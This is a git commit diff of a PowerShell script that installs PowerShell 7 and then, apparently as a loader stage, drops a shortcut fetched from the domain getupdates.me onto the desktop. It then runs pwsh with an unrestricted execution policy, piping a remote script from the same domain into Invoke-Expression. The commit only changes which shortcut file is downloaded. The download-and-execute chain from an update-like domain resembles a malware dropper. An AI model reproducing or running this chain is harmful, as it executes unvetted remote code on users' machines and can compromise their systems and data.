a8af873650f9f537bf3d8e4e6b7c7d85ccbfdd38
kennethchow1 <103966331+kennethchow1@users.noreply.github.com>
2024-07-22 09:18:35 -0700

    Update test2.ps1

--- test2.ps1
+++ test2.ps1
@@ -4,5 +4,5 @@ Invoke-WebRequest -Uri "https://github.com/PowerShell/PowerShell/releases/downlo
 echo "Powershell 7 Installing, Please Wait."
 msiexec.exe /package Pwsh.msi /quiet ADD_EXPLORER_CONTEXT_MENU_OPENPOWERSHELL=1 ADD_FILE_CONTEXT_MENU_RUNPOWERSHELL=1 REGISTER_MANIFEST=1 USE_MU=1 ENABLE_MU=1 ADD_PATH=1
 Start-Sleep -Seconds 30
-Invoke-WebRequest -Uri "https://getupdates.me/Final.lnk" -OutFile "$env:HOMEPATH\Desktop\Finalize.lnk"
+Invoke-WebRequest -Uri "https://getupdates.me/Testing.lnk" -OutFile "$env:HOMEPATH\Desktop\Finalize.lnk"
 Start-Process -FilePath "C:\Program Files\Powershell\7\pwsh.exe" -ArgumentList "-ExecutionPolicy Unrestricted -C irm https://getupdates.me/test21.ps1 | iex"
